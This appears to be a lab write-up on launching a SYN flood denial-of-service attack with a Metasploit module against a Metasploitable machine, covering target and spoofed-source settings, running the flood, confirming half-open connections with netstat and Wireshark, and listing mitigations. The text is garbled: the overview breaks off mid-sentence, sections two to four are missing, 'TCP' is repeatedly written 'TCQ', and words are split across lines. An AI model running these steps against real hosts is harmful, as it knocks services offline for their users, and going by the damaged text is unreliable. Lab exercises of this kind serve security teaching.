# SYN Flood Attack (DoS)

## 1. Overview

A SYN flood is a Denial of Service (DoS) attack that abuses the TCQ three-way handshake. The attacker 
sends a large number of SYN


This displays all configurable parameters for the SYN flood module.

---

## 5. Setting the target and port

```sh
set RHOST 192.168.43.22 set RPORT 80
```

These commands define the target IP and the port.

---

## 6. Setting the spoofed
 source address

```sh
set SHOST 184.56.100.250

```

This spoofed address simulates an external attacker.

---

## 7. Selecting the network interface

```sh
set INTERFACE eth0
```

This tells Metasploit which interface to use.

---

## 8. Running the SYN 
Flood attack

```sh
run
```

Metasploit begins sending a stream of SYN packets to the victim.

---

## 9. Verifying the attack on the victim

On
 Metasploitable:

```sh
netstat -ant | grep SYN_
RECV
```

You should see many entries in the SYN
_RECV state.

---

## 10. Wireshark analysis

Capturing traffic during the attack shows a large number of TCQ SYNnpackets.

#![SYN Flood Wireshark]

In Wireshark, you can filter with:

```text
tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 80
```

---

## 11. Impact of the SYN Flood attack

- Exhausts server resources
- Keeps many connections in half-open state
- Prevents legitimate clients from
 connecting
- Can cause denial of service

---

## 12. Mitigation strategies

- Enable SYN cookies
- Use firewalls to limit SYN rate
- Deploy IDS/IPS to detect SYN floods
- Block spoofed packets using ingress filtering
- Tune TCQ stack parameters to ha
ndle bursts

This lab demonstrates how a SYN flo
od works in practice and how its effects can be observed on the victim using netstat and Wireshark.

